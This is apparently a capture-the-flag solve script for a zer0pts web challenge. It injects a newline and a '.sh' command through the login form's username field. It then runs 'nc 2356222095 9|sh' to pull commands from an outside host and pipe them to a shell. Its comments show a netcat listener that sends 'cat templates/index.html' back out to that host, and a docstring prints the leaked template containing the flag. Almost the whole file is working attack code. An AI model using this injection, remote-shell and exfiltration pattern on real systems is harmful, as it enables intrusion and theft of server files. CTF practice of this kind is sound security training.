#!/usr/bin/env python3

import requests

HOST = 'web.ctf.zer0pts.com'
PORT = 8004



def run(cmd):
    payload = {
        'username': '";\n.sh {}\n'.format(cmd),
        'password': 'legoshi'
    }
    r = requests.post('http://{}:{}/login'.format(HOST, PORT), data=payload)

run('eval nc 2356222095 9|sh')

# echo "cat templates/index.html | nc 2356222095 6666" | nc -vvlp 9
# nc -lvnp 6666
# python3 solve2.py

"""
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>Welcome</title>
    </head>

    <body>
        <h1>Welcome, {{name}}!</h1>
        {% if name == 'admin' %}
        <p>zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?}</p>
        {% else %}
        <p>No flag for you :(</p>
        {% endif %}
    </body>
</html>
"""